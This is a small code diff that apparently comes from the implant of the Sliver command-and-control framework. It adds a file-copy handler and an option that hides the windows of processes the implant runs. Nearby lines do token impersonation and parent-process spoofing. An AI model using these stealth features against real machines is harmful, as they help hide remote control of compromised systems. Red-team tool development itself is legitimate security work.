@@ -96,6 +96,7 @@ var (
 		sliverpb.MsgPwdReq:         pwdHandler,
 		sliverpb.MsgRmReq:          rmHandler,
 		sliverpb.MsgMvReq:          mvHandler,
+		sliverpb.MsgCpReq:          cpHandler,
 		sliverpb.MsgMkdirReq:       mkdirHandler,
 		sliverpb.MsgExecuteReq:     executeHandler,
 		sliverpb.MsgReconfigureReq: reconfigureHandler,
@@ -365,6 +366,8 @@ func executeWindowsHandler(data []byte, resp RPCResponse) {
 	if execReq.UseToken {
 		cmd.SysProcAttr.Token = syscall.Token(priv.CurrentToken)
 	}
+	// Hide the window if requested
+	cmd.SysProcAttr.HideWindow = execReq.HideWindow
 	if execReq.PPid != 0 {
 		err := spoof.SpoofParent(execReq.PPid, cmd)
 		if err != nil {
